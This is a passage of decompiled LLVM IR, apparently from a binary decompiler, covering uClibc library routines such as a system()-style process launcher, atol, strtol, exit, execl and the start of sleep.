  %v8_16a88 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1de88.1050 to i32), i32 ptrtoint ([3 x i8]* @global_var_1de90.1052 to i32), i32 ptrtoint ([3 x i8]* @global_var_1de94.1054 to i32), i32 %v0_169d0, i32 %v0_16a84)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_16a90 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_16a94:                               ; preds = %dec_label_pc_16a4c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_16a9c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16aa8 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_16ab8 = load i32, i32* @r4, align 4
  store i32 %v0_16ab8, i32* %r0.global-to-local, align 4
  %v0_16abc = call i32 @wait4()
  store i32 %v0_16abc, i32* %r0.global-to-local, align 4
  %v7_16ac0 = icmp eq i32 %v0_16abc, -1
  br i1 %v7_16ac0, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_16a94
  store i32 %v0_16abc, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_16a94, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_16ad0 = call i32 @__bsd_signal(i32 3, i32 %v2_169ec)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16adc = call i32 @__bsd_signal(i32 2, i32 %v2_169fc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_16ae8 = call i32 @__bsd_signal(i32 17, i32 %v2_16a0c)
  %v3_16aec = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_16aec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %bb, %dec_label_pc_16a20, %bb11
  %v8_16af4 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_16a20 ], [ %v3_16aec, %bb11 ]
  store i32 %v3_169cc, i32* @r4, align 4
  ret i32 %v8_16af4

; uselistorder directives
  uselistorder i32 %v0_16abc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_16af0, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_16b0c = call i32 @strtol()
  ret i32 %v0_16b0c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_16b14 = call i32 @_stdlib_strto_l()
  ret i32 %v0_16b14
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16b18 = load i32, i32* @r4, align 4
  store i32 %v3_16b18, i32* %stack_var_-36, align 4
  %v0_16b1c = load i32, i32* @r1, align 4
  store i32 %v0_16b1c, i32* %sb.global-to-local, align 4
  %v0_16b20 = load i32, i32* @r2, align 4
  store i32 %v0_16b20, i32* %r5.global-to-local, align 4
  %v0_16b24 = load i32, i32* @r3, align 4
  store i32 %v0_16b24, i32* %fp.global-to-local, align 4
  %v0_16b28 = load i32, i32* @r0, align 4
  %v2_16b3c.pre = load i32, i32* @global_var_264e8, align 4
  br label %dec_label_pc_16b34

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b34, %entry
  %v0_16b6c = phi i32 [ %v0_16b28, %entry ], [ %v1_16b30, %dec_label_pc_16b34 ]
  store i32 %v0_16b6c, i32* %r4.global-to-local, align 4
  %v1_16b38 = inttoptr i32 %v0_16b6c to i8*
  %v2_16b38 = load i8, i8* %v1_16b38, align 1
  %v3_16b38 = zext i8 %v2_16b38 to i32
  store i32 %v3_16b38, i32* @r2, align 4
  %v3_16b40 = mul nuw nsw i32 %v3_16b38, 2
  %v4_16b40 = add i32 %v3_16b40, %v2_16b3c.pre
  %v5_16b40 = inttoptr i32 %v4_16b40 to i8*
  %v6_16b40 = load i8, i8* %v5_16b40, align 1
  %v1_16b44 = and i8 %v6_16b40, 32
  %v2_16b44 = icmp eq i8 %v1_16b44, 0
  %v1_16b30 = add i32 %v0_16b6c, 1
  br i1 %v2_16b44, label %dec_label_pc_16b4c, label %dec_label_pc_16b34

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16b34
  %v7_16b4c = icmp eq i8 %v2_16b38, 43
  br i1 %v7_16b4c, label %dec_label_pc_16b6c, label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16b4c
  %v7_16b54 = icmp eq i8 %v2_16b38, 45
  br i1 %v7_16b54, label %dec_label_pc_16b6c, label %bb

bb:                                               ; preds = %dec_label_pc_16b54
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b70

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16b4c, %dec_label_pc_16b54
  %storemerge43 = phi i32 [ 1, %dec_label_pc_16b54 ], [ 0, %dec_label_pc_16b4c ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_16b30, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16b70

dec_label_pc_16b70:                               ; preds = %bb, %dec_label_pc_16b6c
  %v0_16b90 = phi i32 [ %v0_16b6c, %bb ], [ %v1_16b30, %dec_label_pc_16b6c ]
  %v1_16b70 = and i32 %v0_16b20, -17
  %v3_16b70 = icmp eq i32 %v1_16b70, 0
  br i1 %v3_16b70, label %dec_label_pc_16b7c, label %bb54

bb54:                                             ; preds = %dec_label_pc_16b70
  br label %bb58

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b70
  %v1_16b7c = inttoptr i32 %v0_16b90 to i8*
  %v2_16b7c = load i8, i8* %v1_16b7c, align 1
  %v7_16b80 = icmp eq i8 %v2_16b7c, 48
  %v1_16b84 = add i32 %v0_16b20, 10
  store i32 %v1_16b84, i32* %r5.global-to-local, align 4
  br i1 %v7_16b80, label %dec_label_pc_16b90, label %bb55

bb55:                                             ; preds = %dec_label_pc_16b7c
  br label %.thread8

dec_label_pc_16b90:                               ; preds = %dec_label_pc_16b7c
  %v1_16b90 = add i32 %v0_16b90, 1
  %v2_16b90 = inttoptr i32 %v1_16b90 to i8*
  %v3_16b90 = load i8, i8* %v2_16b90, align 1
  %v4_16b90 = zext i8 %v3_16b90 to i32
  store i32 %v1_16b90, i32* %r4.global-to-local, align 4
  %v1_16b94 = or i32 %v4_16b90, 32
  %v7_16b98 = icmp eq i32 %v1_16b94, 120
  %v1_16b9c = add i32 %v0_16b20, 8
  store i32 %v1_16b9c, i32* %r5.global-to-local, align 4
  br i1 %v7_16b98, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_16b90
  %v3_16ba8 = mul i32 %v1_16b9c, 2
  store i32 %v3_16ba8, i32* %r5.global-to-local, align 4
  %v2_16bac = add i32 %v0_16b90, 2
  store i32 %v2_16bac, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_16b90, %bb55, %bb56
  %v1_16c7028 = phi i32 [ %v0_16b28, %bb55 ], [ %v1_16b90, %bb56 ], [ %v1_16b90, %dec_label_pc_16b90 ]
  %v0_16bf819 = phi i32 [ %v0_16b90, %bb55 ], [ %v2_16bac, %bb56 ], [ %v1_16b90, %dec_label_pc_16b90 ]
  %v0_16bb0 = phi i32 [ %v1_16b84, %bb55 ], [ %v3_16ba8, %bb56 ], [ %v1_16b9c, %dec_label_pc_16b90 ]
  %v5_16bb4 = icmp slt i32 %v0_16bb0, 16
  br i1 %v5_16bb4, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_16c7027 = phi i32 [ %v0_16b28, %bb54 ], [ %v1_16c7028, %.thread8 ], [ %v1_16c7028, %bb57 ]
  %v0_16bf818 = phi i32 [ %v0_16b90, %bb54 ], [ %v0_16bf819, %.thread8 ], [ %v0_16bf819, %bb57 ]
  %v0_16bc8 = phi i32 [ %v0_16b20, %bb54 ], [ %v0_16bb0, %.thread8 ], [ 16, %bb57 ]
  %v1_16bb8 = add i32 %v0_16bc8, -2
  %tmp = icmp ugt i32 %v1_16bb8, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_16bc8

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_16c6c

dec_label_pc_16bc8:                               ; preds = %bb58
  %v2_16bd0 = urem i32 -1, %v0_16bc8
  %v1_16be0 = urem i32 %v2_16bd0, 256
  store i32 %v1_16be0, i32* %sl.global-to-local, align 4
  %v2_16be4 = udiv i32 -1, %v0_16bc8
  store i32 0, i32* @ip, align 4
  store i32 %v2_16be4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16bf8

dec_label_pc_16bf4:                               ; preds = %bb65, %dec_label_pc_16c54
  %v0_16bf4 = phi i32 [ %v1_16c24, %bb65 ], [ %v0_16bf4.pre, %dec_label_pc_16c54 ]
  br label %dec_label_pc_16bf8

dec_label_pc_16bf8:                               ; preds = %dec_label_pc_16bc8, %dec_label_pc_16bf4
  %v1_16c7025 = phi i32 [ %v1_16c7027, %dec_label_pc_16bc8 ], [ %v0_16bf4, %dec_label_pc_16bf4 ]
  %v0_16c24 = phi i32 [ %v0_16bf818, %dec_label_pc_16bc8 ], [ %v0_16bf4, %dec_label_pc_16bf4 ]
  %v1_16bf8 = inttoptr i32 %v0_16c24 to i8*
  %v2_16bf8 = load i8, i8* %v1_16bf8, align 1
  %v3_16bf8 = zext i8 %v2_16bf8 to i32
  %v1_16bfc = add nsw i32 %v3_16bf8, -48
  %v1_16c00 = urem i32 %v1_16bfc, 256
  %v1_16c08 = or i32 %v3_16bf8, 32
  store i32 %v1_16c08, i32* @r2, align 4
  %tmp73 = icmp ult i32 %v1_16c00, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_16c10

dec_label_pc_16c10:                               ; preds = %dec_label_pc_16bf8
  %v1_16c14 = add nsw i32 %v1_16c08, -87
  store i32 %v1_16c14, i32* @r2, align 4
  %tmp74 = icmp ugt i32 %v1_16c08, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_16c10
  %v5_16c1c = urem i32 %v1_16c14, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_16bf8, %dec_label_pc_16c10, %bb59
  %v3_16c4c = phi i32 [ %v1_16c00, %dec_label_pc_16bf8 ], [ 40, %dec_label_pc_16c10 ], [ %v5_16c1c, %bb59 ]
  %v1_16c20 = load i32, i32* %r5.global-to-local, align 4
  %v1_16c24 = add i32 %v0_16c24, 1
  store i32 %v1_16c24, i32* %r4.global-to-local, align 4
  %v6_16c28 = icmp slt i32 %v3_16c4c, %v1_16c20
  br i1 %v6_16c28, label %dec_label_pc_16c2c, label %dec_label_pc_16c6c.loopexit

dec_label_pc_16c2c:                               ; preds = %bb60
  %v0_16c2c = load i32, i32* @ip, align 4
  %v1_16c2c = load i32, i32* %r8.global-to-local, align 4
  %v9_16c2c = icmp eq i32 %v0_16c2c, %v1_16c2c
  br i1 %v9_16c2c, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_16c2c
  br label %dec_label_pc_16c3c

bb61:                                             ; preds = %dec_label_pc_16c2c
  %v3_16c2c = icmp ult i32 %v0_16c2c, %v1_16c2c
  br i1 %v3_16c2c, label %dec_label_pc_16c3c, label %dec_label_pc_16c54

dec_label_pc_16c3c:                               ; preds = %bb61, %.thread37
  %v4_16c442240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_16c3c = load i32, i32* %sl.global-to-local, align 4
  %v3_16c3c = icmp uge i32 %v3_16c4c, %v1_16c3c
  %v9_16c3c = icmp eq i32 %v3_16c4c, %v1_16c3c
  %v2_16c40 = xor i1 %v3_16c3c, true
  %v3_16c40 = or i1 %v9_16c3c, %v2_16c40
  br i1 %v3_16c40, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_16c3c
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_16c3c, %bb62
  %v4_16c44 = phi i32 [ %v4_16c442240, %dec_label_pc_16c3c ], [ 0, %bb62 ]
  %v2_16c44 = xor i1 %v9_16c3c, true
  %v3_16c44 = and i1 %v3_16c3c, %v2_16c44
  br i1 %v3_16c44, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_16c44 = urem i32 %v4_16c44, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_16c48 = phi i32 [ %v5_16c44, %bb64 ], [ %v4_16c44, %bb63 ]
  %v2_16c48 = icmp eq i32 %v0_16c48, 0
  br i1 %v2_16c48, label %bb65, label %dec_label_pc_16c54

bb65:                                             ; preds = %thread-pre-split
  %v4_16c4c = mul i32 %v0_16c2c, %v1_16c20
  %v5_16c4c = add i32 %v4_16c4c, %v3_16c4c
  store i32 %v5_16c4c, i32* @ip, align 4
  br label %dec_label_pc_16bf4

dec_label_pc_16c54:                               ; preds = %bb61, %thread-pre-split
  %v0_16c54 = call i32 @__errno_location()
  %v0_16c58 = load i32, i32* %r7.global-to-local, align 4
  %v1_16c58 = load i32, i32* %fp.global-to-local, align 4
  %v2_16c58 = and i32 %v1_16c58, %v0_16c58
  store i32 %v2_16c58, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_16c64 = inttoptr i32 %v0_16c54 to i32*
  store i32 34, i32* %v2_16c64, align 4
  %v0_16bf4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16bf4

dec_label_pc_16c6c.loopexit:                      ; preds = %bb60
  %v0_16c6c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16c6c

dec_label_pc_16c6c:                               ; preds = %.thread, %dec_label_pc_16c6c.loopexit
  %v1_16c70 = phi i32 [ %v1_16c7025, %dec_label_pc_16c6c.loopexit ], [ %v1_16c7027, %.thread ]
  %v2_16c70 = phi i32 [ %v0_16c6c.pre, %dec_label_pc_16c6c.loopexit ], [ %v0_16b1c, %.thread ]
  %v2_16c6c = icmp eq i32 %v2_16c70, 0
  br i1 %v2_16c6c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_16c6c
  %v3_16c70 = inttoptr i32 %v2_16c70 to i32*
  store i32 %v1_16c70, i32* %v3_16c70, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_16c6c, %bb66
  %v0_16c74 = load i32, i32* %r7.global-to-local, align 4
  %v2_16c74 = icmp eq i32 %v0_16c74, 0
  %. = select i1 %v2_16c74, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_16c80 = load i32, i32* %fp.global-to-local, align 4
  %v2_16c80 = icmp eq i32 %v0_16c80, 0
  %v0_16ca4.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_16c80, label %dec_label_pc_16c9c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_16ca4.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_16c8c, label %dec_label_pc_16c9c

dec_label_pc_16c8c:                               ; preds = %bb70
  %v0_16c8c = call i32 @__errno_location()
  %v2_16c94 = inttoptr i32 %v0_16c8c to i32*
  store i32 34, i32* %v2_16c94, align 4
  %v0_16c98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16c98, i32* @ip, align 4
  %v0_16c9c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16c9c

dec_label_pc_16c9c:                               ; preds = %bb70, %bb67, %dec_label_pc_16c8c
  %v0_16ca4.pre = phi i32 [ %v0_16ca4.pre.pre, %bb70 ], [ %v0_16c98, %dec_label_pc_16c8c ], [ %v0_16ca4.pre.pre, %bb67 ]
  %v0_16c9c = phi i32 [ %v0_16c74, %bb70 ], [ %v0_16c9c.pre, %dec_label_pc_16c8c ], [ %v0_16c74, %bb67 ]
  %v2_16c9c = icmp eq i32 %v0_16c9c, 0
  br i1 %v2_16c9c, label %dec_label_pc_16c9c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_16c9c
  %v2_16ca0 = sub i32 0, %v0_16ca4.pre
  store i32 %v2_16ca0, i32* @ip, align 4
  br label %dec_label_pc_16c9c._crit_edge

dec_label_pc_16c9c._crit_edge:                    ; preds = %dec_label_pc_16c9c, %bb71
  %v0_16ca4 = phi i32 [ %v2_16ca0, %bb71 ], [ %v0_16ca4.pre, %dec_label_pc_16c9c ]
  %v2_16ca8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16ca8, i32* @r4, align 4
  ret i32 %v0_16ca4

; uselistorder directives
  uselistorder i32 %v0_16ca4.pre, { 1, 0 }
  uselistorder i32 %v0_16ca4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_16c44, { 1, 0 }
  uselistorder i1 %v3_16c3c, { 1, 0 }
  uselistorder i32 %v1_16c3c, { 1, 0 }
  uselistorder i32 %v1_16c24, { 1, 0 }
  uselistorder i32 %v1_16c00, { 1, 0 }
  uselistorder i32 %v0_16bf4, { 1, 0 }
  uselistorder i32 %v0_16bc8, { 1, 0, 2 }
  uselistorder i32 %v3_16ba8, { 1, 0 }
  uselistorder i32 %v1_16b9c, { 1, 0, 2 }
  uselistorder i32 %v0_16b90, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_16b30, { 1, 0, 2 }
  uselistorder i32 %v0_16b28, { 1, 0, 2 }
  uselistorder i32 %v0_16b20, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_16c9c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16c9c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_16c6c, { 1, 0 }
  uselistorder label %dec_label_pc_16c54, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16bf8, { 1, 0 }
  uselistorder label %dec_label_pc_16bf4, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b70, { 1, 0 }
  uselistorder label %dec_label_pc_16b6c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16cb0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_16cb0, i32* @r0, align 4
  %v1_16ccc = call i32 @__pthread_return_void()
  %v1_16cdc = call i32 @__pthread_return_0()
  %v2_16ce4 = load i32, i32* @global_var_2ca9c.1062, align 4
  %v2_16ce8 = icmp eq i32 %v2_16ce4, 0
  br i1 %v2_16ce8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_16ce4)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_16cb0, i32* @r0, align 4
  %v1_16d08 = call i32 @__pthread_return_void()
  store i32 %v1_16d08, i32* @r0, align 4
  %v1_16d0c = call i32 @__GI___uClibc_fini(i32 %v1_16d08)
  store i32 93472, i32* @lr, align 4
  %v2_16d1c = call i32 @_stdio_term()
  %v0_16d20 = load i32, i32* @r4, align 4
  %v1_16d24 = call i32 @__GI__exit(i32 %v0_16d20)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 4, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 2, 3, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_16d44 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_16d44, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_16d54 = ptrtoint i32* %stack_var_-32 to i32
  %v2_16d58 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_16d58, i32* %stack_var_-32, align 4
  br label %dec_label_pc_16d64

dec_label_pc_16d64:                               ; preds = %dec_label_pc_16d64, %entry
  %v0_16d78 = phi i32 [ %v1_16d78, %dec_label_pc_16d64 ], [ 0, %entry ]
  %v3_16d64 = phi i32 [ %v1_16d6c, %dec_label_pc_16d64 ], [ %v2_16d58, %entry ]
  %v1_16d68 = inttoptr i32 %v3_16d64 to i32*
  %v2_16d68 = load i32, i32* %v1_16d68, align 4
  %v1_16d6c = add i32 %v3_16d64, 4
  %v2_16d70 = icmp eq i32 %v2_16d68, 0
  store i32 %v1_16d6c, i32* %stack_var_-32, align 4
  %v1_16d78 = add i32 %v0_16d78, 1
  store i32 %v1_16d78, i32* @lr, align 4
  br i1 %v2_16d70, label %dec_label_pc_16d80, label %dec_label_pc_16d64

dec_label_pc_16d80:                               ; preds = %dec_label_pc_16d64
  %v3_16d80.neg = mul i32 %v1_16d78, -4
  %v1_16d84.neg = add i32 %v2_16d54, -8
  %v2_16d88 = add i32 %v1_16d84.neg, %v3_16d80.neg
  %v2_16d90 = inttoptr i32 %v2_16d88 to i32*
  store i32 %arg1, i32* %v2_16d90, align 4
  store i32 %v2_16d58, i32* %stack_var_-32, align 4
  %v0_16d9c = load i32, i32* @sp, align 4
  store i32 %v0_16d9c, i32* @r1, align 4
  store i32 %v0_16d9c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16da4

dec_label_pc_16da4:                               ; preds = %dec_label_pc_16da4.dec_label_pc_16da4_crit_edge, %dec_label_pc_16d80
  %v1_16db8 = phi i32 [ %v5_16db8, %dec_label_pc_16da4.dec_label_pc_16da4_crit_edge ], [ %v0_16d9c, %dec_label_pc_16d80 ]
  %v3_16da4 = phi i32 [ %v3_16da4.pre, %dec_label_pc_16da4.dec_label_pc_16da4_crit_edge ], [ %v2_16d58, %dec_label_pc_16d80 ]
  %v1_16da8 = inttoptr i32 %v3_16da4 to i32*
  %v2_16da8 = load i32, i32* %v1_16da8, align 4
  %v0_16dac = load i32, i32* @lr, align 4
  %v1_16dac = add i32 %v0_16dac, -1
  store i32 %v1_16dac, i32* @lr, align 4
  %v7_16dac = icmp eq i32 %v0_16dac, 1
  %v1_16db0 = add i32 %v3_16da4, 4
  store i32 %v1_16db0, i32* %stack_var_-32, align 4
  %v2_16db8 = add i32 %v1_16db8, 4
  %v3_16db8 = inttoptr i32 %v2_16db8 to i32*
  store i32 %v2_16da8, i32* %v3_16db8, align 4
  %v4_16db8 = load i32, i32* %ip.global-to-local, align 4
  %v5_16db8 = add i32 %v4_16db8, 4
  store i32 %v5_16db8, i32* %ip.global-to-local, align 4
  br i1 %v7_16dac, label %dec_label_pc_16dc0, label %dec_label_pc_16da4.dec_label_pc_16da4_crit_edge

dec_label_pc_16da4.dec_label_pc_16da4_crit_edge:  ; preds = %dec_label_pc_16da4
  %v3_16da4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_16da4

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16da4
  %v2_16dc4 = load i32, i32* @global_var_2caa4.1067, align 4
  store i32 %v2_16dc4, i32* @r2, align 4
  %v0_16dc8 = call i32 @__GI_execve()
  ret i32 %v0_16dc8

; uselistorder directives
  uselistorder i32 %v5_16db8, { 1, 0 }
  uselistorder i32 %v0_16dac, { 1, 0 }
  uselistorder i32 %v1_16d78, { 0, 2, 1 }
  uselistorder i32 %v1_16d6c, { 1, 0 }
  uselistorder i32 %v3_16d64, { 1, 0 }
  uselistorder i32 %v2_16d58, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16dd8 = load i32, i32* @r4, align 4
  store i32 %v3_16dd8, i32* %stack_var_-20, align 4
  %v6_16dd8 = load i32, i32* @r5, align 4
  %v9_16dd8 = load i32, i32* @r6, align 4
  %v16_16dd8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_16ddc = icmp eq i32 %arg1, 0
  %v2_16de0 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_16ddc, label %dec_label_pc_16f64, label %dec_label_pc_16df8.preheader

dec_label_pc_16df8.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_16e0017 = add i32 %v16_16dd8, 124
  br label %dec_label_pc_16df0

dec_label_pc_16df0:                               ; preds = %dec_label_pc_16df8.preheader, %dec_label_pc_16df0
  %v5_16e0018 = phi i32 [ %v5_16e0017, %dec_label_pc_16df8.preheader ], [ %v5_16e00, %dec_label_pc_16df0 ]
  %v2_16df4 = add i32 %v5_16e0018, -136
  %v3_16df4 = inttoptr i32 %v2_16df4 to i32*
  store i32 0, i32* %v3_16df4, align 4
  %v0_16df8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16df8 = add i32 %v0_16df8.pre, -1
  store i32 %v1_16df8, i32* %r1.global-to-local, align 4
  %v6_16df8 = icmp slt i32 %v1_16df8, 0
  %v4_16e00 = mul i32 %v1_16df8, 4
  %v5_16e00 = add i32 %v4_16e00, %v16_16dd8
  br i1 %v6_16df8, label %dec_label_pc_16e08, label %dec_label_pc_16df0

dec_label_pc_16e08:                               ; preds = %dec_label_pc_16df0
  %v2_16e08 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_16e08, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_16e18 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_16e18, i32* %stack_var_-28, align 4
  %v0_16e20 = call i32 @__sigaddset()
  store i32 %v0_16e20, i32* %r0.global-to-local, align 4
  %v1_16e24 = load i32, i32* @r5, align 4
  %v5_16e28 = icmp slt i32 %v0_16e20, %v1_16e24
  br i1 %v5_16e28, label %dec_label_pc_16f6c, label %dec_label_pc_16e2c

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e08
  %v2_16e2c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_16e2c, i32* @r4, align 4
  store i32 %v1_16e24, i32* %r0.global-to-local, align 4
  store i32 %v2_16e08, i32* %r1.global-to-local, align 4
  %v3_16e3c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_16e3c = call i32 @__GI_sigprocmask(i32 %v1_16e24, %_TYPEDEF_sigset_t* %v3_16e3c, i32 %v2_16e2c)
  store i32 %v4_16e3c, i32* %r0.global-to-local, align 4
  %v1_16e40 = load i32, i32* @r5, align 4
  %v9_16e40 = icmp eq i32 %v4_16e3c, %v1_16e40
  br i1 %v9_16e40, label %dec_label_pc_16e48, label %dec_label_pc_16f6c

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e2c
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_16e2c, i32* %r0.global-to-local, align 4
  %v2_16e50 = call i32 @__sigismember(i32 %v2_16e2c, i32 17)
  store i32 %v2_16e50, i32* %r0.global-to-local, align 4
  %v1_16e54 = load i32, i32* @r5, align 4
  %v9_16e54 = icmp eq i32 %v2_16e50, %v1_16e54
  br i1 %v9_16e54, label %dec_label_pc_16e6c.preheader, label %dec_label_pc_16e48.dec_label_pc_16f34_crit_edge

dec_label_pc_16e48.dec_label_pc_16f34_crit_edge:  ; preds = %dec_label_pc_16e48
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_16f34

dec_label_pc_16e6c.preheader:                     ; preds = %dec_label_pc_16e48
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e64

dec_label_pc_16e64:                               ; preds = %dec_label_pc_16e6c.preheader, %dec_label_pc_16e64
  %v5_16e7416 = phi i32 [ %v5_16e0017, %dec_label_pc_16e6c.preheader ], [ %v5_16e74, %dec_label_pc_16e64 ]
  %v2_16e68 = add i32 %v5_16e7416, -136
  %v3_16e68 = inttoptr i32 %v2_16e68 to i32*
